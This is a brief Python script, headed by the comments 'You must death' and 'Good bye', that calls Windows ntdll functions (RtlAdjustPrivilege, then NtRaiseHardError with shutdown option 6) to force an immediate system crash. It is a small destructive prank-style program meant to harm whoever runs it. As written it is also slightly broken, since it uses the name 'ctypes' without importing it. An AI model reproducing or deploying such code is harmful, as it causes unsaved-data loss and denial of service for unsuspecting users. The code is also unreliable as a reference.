# You must death

# Good bye

from ctypes import *
from ctypes.wintypes import *
var1 = c_bool()
var2 = DWORD()
ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(var1))
ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, byref(var2))
